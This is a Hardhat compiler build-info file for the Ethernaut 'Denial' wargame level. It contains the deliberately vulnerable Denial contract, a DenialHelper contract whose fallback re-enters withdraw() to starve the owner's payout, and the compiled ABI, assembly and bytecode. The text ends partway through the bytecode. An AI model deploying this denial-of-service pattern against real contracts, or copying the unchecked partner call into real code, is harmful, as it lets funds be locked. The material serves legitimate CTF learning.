{
	"id": "3be3a56eb5265222ac5de626ab779f47",
	"_format": "hh-sol-build-info-1",
	"solcVersion": "0.6.12",
	"solcLongVersion": "0.6.12+commit.27d51765",
	"input": {
		"language": "Solidity",
		"sources": {
			"contracts/Ethernaut/DenialHelper.sol": {
				"content": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.6.0;\r\nimport \"./Denial.sol\";\r\n\r\ncontract DenialHelper {\r\n    Denial denialInst;\r\n\r\n    constructor(address payable denialAddr) public {\r\n        denialInst = Denial(denialAddr);\r\n    }\r\n\r\n    fallback() external payable {\r\n        denialInst.withdraw();\r\n    }\r\n}"
			},
			"contracts/Ethernaut/Denial.sol": {
				"content": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.6.0;\r\n\r\nimport \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.1.0/contracts/math/SafeMath.sol\";\r\n\r\ncontract Denial {\r\n\r\n    using SafeMath for uint256;\r\n    address public partner; // withdrawal partner - pay the gas, split the withdraw\r\n    address payable public constant owner = address(0xA9E);\r\n    uint timeLastWithdrawn;\r\n    mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances\r\n\r\n    function setWithdrawPartner(address _partner) public {\r\n        partner = _partner;\r\n    }\r\n\r\n    // withdraw 1% to recipient and 1% to owner\r\n    function withdraw() public {\r\n        uint amountToSend = address(this).balance.div(100);\r\n        // perform a call without checking return\r\n        // The recipient can revert, the owner will still get their share\r\n        partner.call{value:amountToSend}(\"\");\r\n        owner.transfer(amountToSend);\r\n        // keep track of last withdrawal time\r\n        timeLastWithdrawn = now;\r\n        withdrawPartnerBalances[partner] = withdrawPartnerBalances[partner].add(amountToSend);\r\n    }\r\n\r\n    // allow deposit of funds\r\n    receive() external payable {}\r\n\r\n    // convenience function\r\n    function contractBalance() public view returns (uint) {\r\n        return address(this).balance;\r\n    }\r\n}"
			},
			"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.1.0/contracts/math/SafeMath.sol": {
				"content": "// SPDX-License-Identifier: MIT\n\npragma solidity ^0.6.0;\n\n/**\n * @dev Wrappers over Solidity's arithmetic operations with added overflow\n * checks.\n *\n * Arithmetic operations in Solidity wrap on overflow. This can easily result\n * in bugs, because programmers usually assume that an overflow raises an\n * error, which is the standard behavior in high level programming languages.\n * `SafeMath` restores this intuition by reverting the transaction when an\n * operation overflows.\n *\n * Using this library instead of the unchecked operations eliminates an entire\n * class of bugs, so it's recommended to use it always.\n */\nlibrary SafeMath {\n    /**\n     * @dev Returns the addition of two unsigned integers, reverting on\n     * overflow.\n     *\n     * Counterpart to Solidity's `+` operator.\n     *\n     * Requirements:\n     *\n     * - Addition cannot overflow.\n     */\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    /**\n     * @dev Returns the subtraction of two unsigned integers, reverting on\n     * overflow (when the result is negative).\n     *\n     * Counterpart to Solidity's `-` operator.\n     *\n     * Requirements:\n     *\n     * - Subtraction cannot overflow.\n     */\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    /**\n     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on\n     * overflow (when the result is negative).\n     *\n     * Counterpart to Solidity's `-` operator.\n     *\n     * Requirements:\n     *\n     * - Subtraction cannot overflow.\n     */\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    /**\n     * @dev Returns the multiplication of two unsigned integers, reverting on\n     * overflow.\n     *\n     * Counterpart to Solidity's `*` operator.\n     *\n     * Requirements:\n     *\n     * - Multiplication cannot overflow.\n     */\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the\n        // benefit is lost if 'b' is also tested.\n        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    /**\n     * @dev Returns the integer division of two unsigned integers. Reverts on\n     * division by zero. The result is rounded towards zero.\n     *\n     * Counterpart to Solidity's `/` operator. Note: this function uses a\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\n     * uses an invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     *\n     * - The divisor cannot be zero.\n     */\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    /**\n     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on\n     * division by zero. The result is rounded towards zero.\n     *\n     * Counterpart to Solidity's `/` operator. Note: this function uses a\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\n     * uses an invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     *\n     * - The divisor cannot be zero.\n     */\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n        // assert(a == b * c + a % b); // There is no case in which this doesn't hold\n\n        return c;\n    }\n\n    /**\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n     * Reverts when dividing by zero.\n     *\n     * Counterpart to Solidity's `%` operator. This function uses a `revert`\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\n     * invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     *\n     * - The divisor cannot be zero.\n     */\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    /**\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n     * Reverts with custom message when dividing by zero.\n     *\n     * Counterpart to Solidity's `%` operator. This function uses a `revert`\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\n     * invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     *\n     * - The divisor cannot be zero.\n     */\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n"
			}
		},
		"settings": {
			"optimizer": {
				"enabled": false,
				"runs": 200
			},
			"outputSelection": {
				"*": {
					"": [
						"ast"
					],
					"*": [
						"abi",
						"metadata",
						"devdoc",
						"userdoc",
						"storageLayout",
						"evm.legacyAssembly",
						"evm.bytecode",
						"evm.deployedBytecode",
						"evm.methodIdentifiers",
						"evm.gasEstimates",
						"evm.assembly"
					]
				}
			}
		}
	},
	"output": {
		"contracts": {
			"contracts/Ethernaut/Denial.sol": {
				"Denial": {
					"abi": [
						{
							"inputs": [],
							"name": "contractBalance",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "owner",
							"outputs": [
								{
									"internalType": "address payable",
									"name": "",
									"type": "address"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "partner",
							"outputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "_partner",
									"type": "address"
								}
							],
							"name": "setWithdrawPartner",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "withdraw",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"stateMutability": "payable",
							"type": "receive"
						}
					],
					"devdoc": {
						"kind": "dev",
						"methods": {},
						"version": 1
					},
					"evm": {
						"assembly": "    /* \"contracts/Ethernaut/Denial.sol\":176:1342  contract Denial {\r... */\n  mstore(0x40, 0x80)\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"contracts/Ethernaut/Denial.sol\":176:1342  contract Denial {\r... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x3ccfd60b\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x4e1c5914\n      eq\n      tag_4\n      jumpi\n      dup1\n      0x8b7afe2e\n      eq\n      tag_5\n      jumpi\n      dup1\n      0x8da5cb5b\n      eq\n      tag_6\n      jumpi\n      dup1\n      0xbe10862b\n      eq\n      tag_7\n      jumpi\n      jump(tag_2)\n    tag_1:\n      jumpi(tag_2, calldatasize)\n      stop\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"contracts/Ethernaut/Denial.sol\":648:1133  function withdraw() public {\r... */\n    tag_3:\n      callvalue\n      dup1\n      iszero\n      tag_10\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_10:\n      pop\n      tag_11\n      tag_12\n      jump\t// in\n    tag_11:\n      stop\n        /* \"contracts/Ethernaut/Denial.sol\":501:591  function setWithdrawPartner(address _partner) public {\r... */\n    tag_4:\n      callvalue\n      dup1\n      iszero\n      tag_13\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_13:\n      pop\n      tag_14\n      0x04\n      dup1\n      calldatasize\n      sub\n      0x20\n      dup2\n      lt\n      iszero\n      tag_15\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_15:\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      calldataload\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      tag_16\n      jump\t// in\n    tag_14:\n      stop\n        /* \"contracts/Ethernaut/Denial.sol\":1238:1339  function contractBalance() public view returns (uint) {\r... */\n    tag_5:\n      callvalue\n      dup1\n      iszero\n      tag_17\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_17:\n      pop\n      tag_18\n      tag_19\n      jump\t// in\n    tag_18:\n      mload(0x40)\n      dup1\n      dup3\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/Ethernaut/Denial.sol\":319:373  address payable public constant owner = address(0xA9E) */\n    tag_6:\n      callvalue\n      dup1\n      iszero\n      tag_20\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_20:\n      pop\n      tag_21\n      tag_22\n      jump\t// in\n    tag_21:\n      mload(0x40)\n      dup1\n      dup3\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/Ethernaut/Denial.sol\":234:256  address public partner */\n    tag_7:\n      callvalue\n      dup1\n      iszero\n      tag_23\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_23:\n      pop\n      tag_24\n      tag_25\n      jump\t// in\n    tag_24:\n      mload(0x40)\n      dup1\n      dup3\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/Ethernaut/Denial.sol\":648:1133  function withdraw() public {\r... */\n    tag_12:\n        /* \"contracts/Ethernaut/Denial.sol\":686:703  uint amountToSend */\n      0x00\n        /* \"contracts/Ethernaut/Denial.sol\":706:736  address(this).balance.div(100) */\n      tag_27\n        /* \"contracts/Ethernaut/Denial.sol\":732:735  100 */\n      0x64\n        /* \"contracts/Ethernaut/Denial.sol\":706:727  address(this).balance */\n      selfbalance\n        /* \"contracts/Ethernaut/Denial.sol\":706:731  address(this).balance.div */\n      tag_28\n      swap1\n        /* \"contracts/Ethernaut/Denial.sol\":706:736  address(this).balance.div(100) */\n      swap2\n      swap1\n      0xffffffff\n      and\n      jump\t// in\n    tag_27:\n        /* \"contracts/Ethernaut/Denial.sol\":686:736  uint amountToSend = address(this).balance.div(100) */\n      swap1\n      pop\n        /* \"contracts/Ethernaut/Denial.sol\":873:880  partner */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Ethernaut/Denial.sol\":873:885  partner.call */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Ethernaut/Denial.sol\":892:904  amountToSend */\n      dup2\n        /* \"contracts/Ethernaut/Denial.sol\":873:909  partner.call{value:amountToSend}(\"\") */\n      mload(0x40)\n      dup1\n      0x00\n      add\n      swap1\n      pop\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup8\n      gas\n      call\n      swap3\n      pop\n      pop\n      pop\n      returndatasize\n      dup1\n      0x00\n      dup2\n      eq\n      tag_31\n      jumpi\n      mload(0x40)\n      swap2\n      pop\n      and(add(returndatasize, 0x3f), not(0x1f))\n      dup3\n      add\n      0x40\n      mstore\n      returndatasize\n      dup3\n      mstore\n      returndatasize\n      0x00\n      0x20\n      dup5\n      add\n      returndatacopy\n      jump(tag_30)\n    tag_31:\n      0x60\n      swap2\n      pop\n    tag_30:\n      pop\n      pop\n      pop\n        /* \"contracts/Ethernaut/Denial.sol\":367:372  0xA9E */\n      0x0a9e\n        /* \"contracts/Ethernaut/Denial.sol\":920:934  owner.transfer */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Ethernaut/Denial.sol\":920:948  owner.transfer(amountToSend) */\n      0x08fc\n        /* \"contracts/Ethernaut/Denial.sol\":935:947  amountToSend */\n      dup3\n        /* \"contracts/Ethernaut/Denial.sol\":920:948  owner.transfer(amountToSend) */\n      swap1\n      dup2\n      iszero\n      mul\n      swap1\n      mload(0x40)\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup9\n      call\n      swap4\n      pop\n      pop\n      pop\n      pop\n      iszero\n      dup1\n      iszero\n      tag_33\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_33:\n      pop\n        /* \"contracts/Ethernaut/Denial.sol\":1026:1029  now */\n      timestamp\n        /* \"contracts/Ethernaut/Denial.sol\":1006:1023  timeLastWithdrawn */\n      0x01\n        /* \"contracts/Ethernaut/Denial.sol\":1006:1029  timeLastWithdrawn = now */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"contracts/Ethernaut/Denial.sol\":1075:1125  withdrawPartnerBalances[partner].add(amountToSend) */\n      tag_34\n        /* \"contracts/Ethernaut/Denial.sol\":1112:1124  amountToSend */\n      dup2\n        /* \"contracts/Ethernaut/Denial.sol\":1075:1098  withdrawPartnerBalances */\n      0x02\n        /* \"contracts/Ethernaut/Denial.sol\":1075:1107  withdrawPartnerBalances[partner] */\n      0x00\n        /* \"contracts/Ethernaut/Denial.sol\":1099:1106  partner */\n      dup1\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Ethernaut/Denial.sol\":1075:1107  withdrawPartnerBalances[partner] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n      sload\n        /* \"contracts/Ethernaut/Denial.sol\":1075:1111  withdrawPartnerBalances[partner].add */\n      tag_35\n      swap1\n        /* \"contracts/Ethernaut/Denial.sol\":1075:1125  withdrawPartnerBalances[partner].add(amountToSend) */\n      swap2\n      swap1\n      0xffffffff\n      and\n      jump\t// in\n    tag_34:\n        /* \"contracts/Ethernaut/Denial.sol\":1040:1063  withdrawPartnerBalances */\n      0x02\n        /* \"contracts/Ethernaut/Denial.sol\":1040:1072  withdrawPartnerBalances[partner] */\n      0x00\n        /* \"contracts/Ethernaut/Denial.sol\":1064:1071  partner */\n      dup1\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Ethernaut/Denial.sol\":1040:1072  withdrawPartnerBalances[partner] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n        /* \"contracts/Ethernaut/Denial.sol\":1040:1125  withdrawPartnerBalances[partner] = withdrawPartnerBalances[partner].add(amountToSend) */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"contracts/Ethernaut/Denial.sol\":648:1133  function withdraw() public {\r... */\n      pop\n      jump\t// out\n        /* \"contracts/Ethernaut/Denial.sol\":501:591  function setWithdrawPartner(address _partner) public {\r... */\n    tag_16:\n        /* \"contracts/Ethernaut/Denial.sol\":575:583  _partner */\n      dup1\n        /* \"contracts/Ethernaut/Denial.sol\":565:572  partner */\n      0x00\n      dup1\n        /* \"contracts/Ethernaut/Denial.sol\":565:583  partner = _partner */\n      0x0100\n      exp\n      dup2\n      sload\n      dup2\n      0xffffffffffffffffffffffffffffffffffffffff\n      mul\n      not\n      and\n      swap1\n      dup4\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      mul\n      or\n      swap1\n      sstore\n      pop\n        /* \"contracts/Ethernaut/Denial.sol\":501:591  function setWithdrawPartner(address _partner) public {\r... */\n      pop\n      jump\t// out\n        /* \"contracts/Ethernaut/Denial.sol\":1238:1339  function contractBalance() public view returns (uint) {\r... */\n    tag_19:\n        /* \"contracts/Ethernaut/Denial.sol\":1286:1290  uint */\n      0x00\n        /* \"contracts/Ethernaut/Denial.sol\":1310:1331  address(this).balance */\n      selfbalance\n        /* \"contracts/Ethernaut/Denial.sol\":1303:1331  return address(this).balance */\n      swap1\n      pop\n        /* \"contracts/Ethernaut/Denial.sol\":1238:1339  function contractBalance() public view returns (uint) {\r... */\n      swap1\n      jump\t// out\n        /* \"contracts/Ethernaut/Denial.sol\":319:373  address payable public constant owner = address(0xA9E) */\n    tag_22:\n        /* \"contracts/Ethernaut/Denial.sol\":367:372  0xA9E */\n      0x0a9e\n        /* \"contracts/Ethernaut/Denial.sol\":319:373  address payable public constant owner = address(0xA9E) */\n      dup2\n      jump\t// out\n        /* \"contracts/Ethernaut/Denial.sol\":234:256  address public partner */\n    tag_25:\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.1.0/contracts/math/SafeMath.sol\":3101:3231  function div(uint256 a, uint256 b) internal pure returns (uint256) {... */\n    tag_28:\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.1.0/contracts/math/SafeMath.sol\":3159:3166  uint256 */\n      0x00\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.1.0/contracts/math/SafeMath.sol\":3185:3224  div(a, b, \"SafeMath: division by zero\") */\n      tag_39\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.1.0/contracts/math/SafeMath.sol\":3189:3190  a */\n      dup4\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.1.0/contracts/math/SafeMath.sol\":3192:3193  b */\n      dup4\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.1.0/contracts/math/SafeMath.sol\":3185:3224  div(a, b, \"SafeMath: division by zero\") */\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x1a\n      dup2\n      mstore\n      0x20\n      add\n      0x536166654d6174683a206469766973696f6e206279207a65726f000000000000\n      dup2\n      mstore\n      pop\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.1.0/contracts/math/SafeMath.sol\":3185:3188  div */\n      tag_40\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.1.0/contracts/math/SafeMath.sol\":3185:3224  div(a, b, \"SafeMath: division by zero\") */\n      jump\t// in\n    tag_39:\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.1.0/contracts/math/SafeMath.sol\":3178:3224  return div(a, b, \"SafeMath: division by zero\") */\n      swap1\n      pop\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.1.0/contracts/math/SafeMath.sol\":3101:3231  function div(uint256 a, uint256 b) internal pure returns (uint256) {... */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.1.0/contracts/math/SafeMath.sol\":874:1050  function add(uint256 a, uint256 b) internal pure returns (uint256) {... */\n    tag_35:\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.1.0/contracts/math/SafeMath.sol\":932:939  uint256 */\n      0x00\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.1.0/contracts/math/SafeMath.sol\":951:960  uint256 c */\n      dup1\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.1.0/contracts/math/SafeMath.sol\":967:968  b */\n      dup3\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.1.0/contracts/math/SafeMath.sol\":963:964  a */\n      dup5\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.1.0/contracts/math/SafeMath.sol\":963:968  a + b */\n      add\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.1.0/contracts/math/SafeMath.sol\":951:968  uint256 c = a + b */\n      swap1\n      pop\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.1.0/contracts/math/SafeMath.sol\":991:992  a */\n      dup4\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.1.0/contracts/math/SafeMath.sol\":986:987  c */\n      dup2\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.1.0/contracts/math/SafeMath.sol\":986:992  c >= a */\n      lt\n      iszero\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.1.0/contracts/math/SafeMath.sol\":978:1024  require(c >= a, \"SafeMath: addition overflow\") */\n      tag_42\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x1b\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      0x536166654d6174683a206164646974696f6e206f766572666c6f770000000000\n      dup2\n      mstore\n      pop\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_42:\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.1.0/contracts/math/SafeMath.sol\":1042:1043  c */\n      dup1\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.1.0/contracts/math/SafeMath.sol\":1035:1043  return c */\n      swap2\n      pop\n      pop\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.1.0/contracts/math/SafeMath.sol\":874:1050  function add(uint256 a, uint256 b) internal pure returns (uint256) {... */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.1.0/contracts/math/SafeMath.sol\":3713:3985  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {... */\n    tag_40:\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.1.0/contracts/math/SafeMath.sol\":3799:3806  uint256 */\n      0x00\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.1.0/contracts/math/SafeMath.sol\":3830:3831  0 */\n      dup1\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.1.0/contracts/math/SafeMath.sol\":3826:3827  b */\n      dup4\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.1.0/contracts/math/SafeMath.sol\":3826:3831  b > 0 */\n      gt\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.1.0/contracts/math/SafeMath.sol\":3833:3845  errorMessage */\n      dup3\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.1.0/contracts/math/SafeMath.sol\":3818:3846  require(b > 0, errorMessage) */\n      swap1\n      tag_44\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      dup4\n      dup2\n      dup2\n      mload\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n      0x00\n    tag_45:\n      dup4\n      dup2\n      lt\n      iszero\n      tag_47\n      jumpi\n      dup1\n      dup3\n      add\n      mload\n      dup2\n      dup5\n      add\n      mstore\n      0x20\n      dup2\n      add\n      swap1\n      pop\n      jump(tag_45)\n    tag_47:\n      pop\n      pop\n      pop\n      pop\n      swap1\n      pop\n      swap1\n      dup2\n      add\n      swap1\n      0x1f\n      and\n      dup1\n      iszero\n      tag_48\n      jumpi\n      dup1\n      dup3\n      sub\n      dup1\n      mload\n      0x01\n      dup4\n      0x20\n      sub\n      0x0100\n      exp\n      sub\n      not\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n    tag_48:\n      pop\n      swap3\n      pop\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_44:\n      pop\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.1.0/contracts/math/SafeMath.sol\":3856:3865  uint256 c */\n      0x00\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.1.0/contracts/math/SafeMath.sol\":3872:3873  b */\n      dup4\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.1.0/contracts/math/SafeMath.sol\":3868:3869  a */\n      dup6\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.1.0/contracts/math/SafeMath.sol\":3868:3873  a / b */\n      dup2\n      tag_49\n      jumpi\n      invalid\n    tag_49:\n      div\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.1.0/contracts/math/SafeMath.sol\":3856:3873  uint256 c = a / b */\n      swap1\n      pop\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.1.0/contracts/math/SafeMath.sol\":3977:3978  c */\n      dup1\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.1.0/contracts/math/SafeMath.sol\":3970:3978  return c */\n      swap2\n      pop\n      pop\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.1.0/contracts/math/SafeMath.sol\":3713:3985  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {... */\n      swap4\n      swap3\n      pop\n      pop\n      pop\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220c3e1d1f0a9287622a27cbe84f75639c9e24f22de79cddac85b10e148ec0333d064736f6c634300060c0033\n}\n",
						"bytecode": {
							"linkReferences": {},
							"object": "608060405234801561001057600080fd5b5061057a806100206000396000f3fe60806040526004361061004e5760003560e01c80633ccfd60b1461005a5780634e1c5914146100715780638b7afe2e146100c25780638da5cb5b146100ed578063be10862b1461012e57610055565b3661005557005b600080fd5b34801561006657600080fd5b5061006f61016f565b005b34801561007d57600080fd5b506100c06004803603602081101561009457600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610337565b005b3480156100ce57600080fd5b506100d761037a565b6040518082815260200191505060405180910390f35b3480156100f957600080fd5b50610102610382565b604051808273ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b34801561013a57600080fd5b50610143610388565b604051808273ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b60006101856064476103ac90919063ffffffff16565b905060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168160405180600001905060006040518083038185875af1925050503d8060008114610205576040519150601f19603f3d011682016040523d82523d6000602084013e61020a565b606091505b505050610a9e73ffffffffffffffffffffffffffffffffffffffff166108fc829081150290604051600060405180830381858888f19350505050158015610255573d6000803e3d6000fd5b50426001819055506102d081600260008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020546103f690919063ffffffff16565b600260008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000208190555050565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b60004790509056